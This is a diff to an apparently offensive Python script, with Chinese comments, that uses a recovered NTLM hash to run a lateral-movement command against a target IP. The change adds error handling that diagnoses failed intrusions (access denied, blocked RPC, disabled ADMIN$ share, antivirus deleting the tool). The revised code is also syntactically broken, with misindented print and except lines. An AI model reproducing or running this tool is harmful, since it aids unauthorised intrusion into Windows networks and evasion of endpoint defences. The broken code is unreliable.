@@ -62,10 +62,9 @@ def main():
     if ntlm_hash:
         print(f"[+] Found Verified Hash: {ntlm_hash}")
 
-        # 檢查工具是否存在，英文錯誤訊息提示 AV 攔截
+        # 檢查工具是否存在
         if not os.path.exists(tool_name):
             print(f"Error: '{tool_name}' not found.")
-            print(f"The tool might have been deleted or quarantined by Antivirus (AV/EDR).")
             sys.exit(1)
 
         # 執行指令
@@ -75,29 +74,38 @@ def main():
         print(f"Authenticating as: {find_user}")
 
         try:
-            print("-" * 30 + " REMOTE OUTPUT " + "-" * 30)
-            # 執行攻擊指令
             subprocess.run(attack_command, check=True)
-            print("-" * 60)
             print(f"[+] SUCCESS: Lateral movement to {target_ip} completed.")
 
         except subprocess.CalledProcessError as e:
-            print("-" * 60)
-            print(f"FAILURE: Command returned an error code ({e.returncode}).")
-            # --- 判斷失敗原因 ---
-            if e.returncode == 1:
-                print("    - Reason: Potential Access Denied (Invalid Hash or Insufficient Privileges).")
-            elif e.returncode == 127:
-                print("    - Reason: Tool path error or binary not executable.")
-            else:
-                print("    - Reason: Network timeout, RPC service disabled, or AV/EDR block.")
-            print("-" * 60)
+            error_msg = e.stderr.lower() if e.stderr else ""
+            print(f"[-] FAILURE: Command failed with return code ({e.returncode}).")
 
-        except FileNotFoundError:
+            # --- 更加精確的判斷邏輯 ---
+            if "logon_failure" in error_msg or "access_denied" in error_msg:
+            print("    - Reason: Authentication Failed (Invalid Password/Hash) or Insufficient Privileges.")
+    
+            elif "rpc_s_server_unavailable" in error_msg or "connection refused" in error_msg:
+                print("    - Reason: Network Connectivity Issue (Port 135 blocked or Target Offline).")
+    
+            elif "status_object_name_not_found" in error_msg:
+                print("    - Reason: Admin share (ADMIN$) is disabled on the target.")
+
+            elif e.returncode == 127:
+                print("    - Reason: Tool path error or Python environment issue.")
+    
+            elif e.returncode == 1:
+                # 如果沒有具體字串但 code 是 1，通常是通用錯誤或被防火牆丟包
+                print("    - Reason: General failure. Check Firewall, UAC settings, or Anti-Virus.")
+
+            else:
+                print(f"    - Raw Error Output: {e.stderr.strip()}")
+                
+    except FileNotFoundError:
             print(f"FAILURE: '{tool_name}' disappeared during execution!")
             print("Reason: Highly likely deleted by Real-Time Protection (AV/EDR).")
 
-        except Exception as e:
+    except Exception as e:
             print(f"FAILURE: An unexpected error occurred: {e}")
 
 if __name__ == "__main__":
